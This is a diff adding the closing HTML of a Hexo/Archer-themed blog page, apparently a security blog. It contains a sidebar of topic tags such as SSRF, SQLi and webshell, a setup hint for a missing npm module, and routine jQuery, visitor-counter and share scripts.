+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="Writeup"><span class="iconfont-archer">&#xe606;</span>Writeup</span>
+    
+        <span class="sidebar-tag-name" data-tags="php 伪随机数"><span class="iconfont-archer">&#xe606;</span>php 伪随机数</span>
+    
+        <span class="sidebar-tag-name" data-tags="算法"><span class="iconfont-archer">&#xe606;</span>算法</span>
+    
+        <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
+    
+        <span class="sidebar-tag-name" data-tags="读书笔记"><span class="iconfont-archer">&#xe606;</span>读书笔记</span>
+    
+        <span class="sidebar-tag-name" data-tags="漏洞分析"><span class="iconfont-archer">&#xe606;</span>漏洞分析</span>
+    
+        <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
+    
+        <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
+    
+        <span class="sidebar-tag-name" data-tags="Docker"><span class="iconfont-archer">&#xe606;</span>Docker</span>
+    
+        <span class="sidebar-tag-name" data-tags="反序列化"><span class="iconfont-archer">&#xe606;</span>反序列化</span>
+    
+        <span class="sidebar-tag-name" data-tags="SQLi"><span class="iconfont-archer">&#xe606;</span>SQLi</span>
+    
+        <span class="sidebar-tag-name" data-tags="php"><span class="iconfont-archer">&#xe606;</span>php</span>
+    
+        <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
+    
+        <span class="sidebar-tag-name" data-tags="ThinkPHP"><span class="iconfont-archer">&#xe606;</span>ThinkPHP</span>
+    
+        <span class="sidebar-tag-name" data-tags="redis"><span class="iconfont-archer">&#xe606;</span>redis</span>
+    
+        <span class="sidebar-tag-name" data-tags="frida"><span class="iconfont-archer">&#xe606;</span>frida</span>
+    
+        <span class="sidebar-tag-name" data-tags="smarty"><span class="iconfont-archer">&#xe606;</span>smarty</span>
+    
+        <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
+    
+        <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
+    
+        <span class="sidebar-tag-name" data-tags="命令注入"><span class="iconfont-archer">&#xe606;</span>命令注入</span>
+    
+        <span class="sidebar-tag-name" data-tags="心得"><span class="iconfont-archer">&#xe606;</span>心得</span>
+    
+        <span class="sidebar-tag-name" data-tags="webshell"><span class="iconfont-archer">&#xe606;</span>webshell</span>
+    
+        <span class="sidebar-tag-name" data-tags="SSRF"><span class="iconfont-archer">&#xe606;</span>SSRF</span>
+    
+        <span class="sidebar-tag-name" data-tags="笔记"><span class="iconfont-archer">&#xe606;</span>笔记</span>
+    
+        <span class="sidebar-tag-name" data-tags="SQL"><span class="iconfont-archer">&#xe606;</span>SQL</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br>
+    1、请确保node版本大于6.2<br>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "wywwzjj"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
